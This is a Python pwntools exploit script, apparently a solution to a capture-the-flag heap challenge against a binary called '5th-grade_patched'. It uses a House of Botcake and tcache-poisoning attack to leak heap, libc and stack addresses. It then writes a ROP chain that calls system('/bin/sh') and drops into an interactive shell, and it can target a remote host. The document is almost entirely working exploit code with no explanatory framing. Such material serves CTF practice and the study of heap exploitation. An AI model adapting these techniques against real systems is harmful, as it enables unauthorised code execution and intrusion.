from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
'''.format(**locals())

exe = './5th-grade_patched'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context(terminal=['tmux', 'split-window', '-h'])
libc = ELF("./libc.so.6", checksec=False)

def menu():
    io.recvline_contains(b"Choose an option:")

def allocate(idx, size):
    menu()
    io.sendline(b"1")
    io.sendline(str(idx).encode())
    io.sendline(str(size).encode())

def edit(idx, content):
    menu()
    io.sendline(b"2")
    io.sendline(str(idx).encode())
    io.sendline(content)

def free(idx):
    menu()
    io.sendline(b"3")
    io.sendline(str(idx).encode())

def view(idx):
    menu()
    io.sendline(b'4')
    io.sendline(str(idx).encode())

def exit():
    menu()
    io.sendline(b'5')

io = start()

# House of botcake + libc, heap leak

for i in range(7):
    allocate(i, 0x100)

free(0)
view(0)

io.recvline()
heapleak = u64(io.recvline()[:-1].ljust(8, b'\x00')) << 12
log.success("Heap leak: %#x", heapleak)

if args.REMOTE:
    heapleak += 0x1000

allocate(0, 0x100) # get chunk back from leaking

allocate(7, 0x100) # prev
allocate(8, 0x100) # a
allocate(9, 0x10) # prevent consolidation

# fill tcache
for i in range(7):
    free(i)

free(8) # will go to unsorted bin
free(7) # will consolidate with chunk a

# leak libc
view(8)
io.recvline()
libc_leak = u64(io.recvline()[:-1].ljust(8, b'\x00'))
libc.address = libc_leak - 0x219ce0
environ = libc.sym.environ

log.success("Libc leak: %#x", libc_leak)
log.success("Libc base: %#x", libc.address)
log.info("environ: %#x", libc.sym.environ)

# add a to tcache 
allocate(0, 0x100)
free(8) # free a again

allocate(1, 0x130) 
edit(1, b"A"*0x108 + p64(0x111) + p64(((heapleak + 0xf40) >> 12) ^ (environ))) # overwrite next pointer to environ
allocate(2, 0x100)
allocate(3, 0x100) # chunk at environ
view(3) # leak environ address

io.recvline()   
stackleak = u64(io.recvline()[:-1].ljust(8, b'\x00'))
rip = stackleak - 0x198 # return address of _IO_getline_info
log.success("Stack leak: %#x", stackleak)
log.success("Rip: %#x", rip)

## Put rop chain on stack

free(1)
free(2)

# create rop chain
rop = ROP(libc)
payload = flat(
    rop.find_gadget(['ret']).address,
    rop.find_gadget(['pop rdi', 'ret']).address,
    next(libc.search(b'/bin/sh')),
    libc.sym.system  
    )

allocate(1, 0x130) 
edit(1, b"A"*0x108 + p64(0x111) + p64(((heapleak + 0xf40) >> 12) ^ (rip))) # overwrite next pointer to stack
allocate(2, 0x100)
allocate(3, 0x100) # chunk at stack
edit(3, p64(rip) + payload) # put padding for pop 15 then rop chain

io.interactive()
